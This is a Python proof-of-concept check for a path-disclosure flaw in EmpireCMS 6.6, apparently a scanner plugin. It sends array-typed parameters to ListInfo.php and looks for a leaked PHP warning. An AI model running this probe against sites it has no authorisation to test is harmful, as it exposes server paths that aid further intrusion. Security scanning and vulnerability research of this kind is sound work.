# coding: utf-8
import requests
import random

#EmpireCMS 6.6 路径泄漏
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    header = {'User-Agent': user_agent}

    #漏洞位置
    exploit_url=url+'/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&'

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(exploit_url, headers=header, proxies=proxies)
    else:
        response = requests.get(exploit_url, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code==200:
        if 'Warning: addslashes() ' in response.text:
            return 'EmpireCMS V6.6 - 路径泄漏'


def run(url,logindict,user_agent,proxies):
    result = poc(url,logindict,user_agent,proxies)
    return result

#run("http://127.0.0.1/EmpireCMS6.0/",{'admin':'admin'},'','')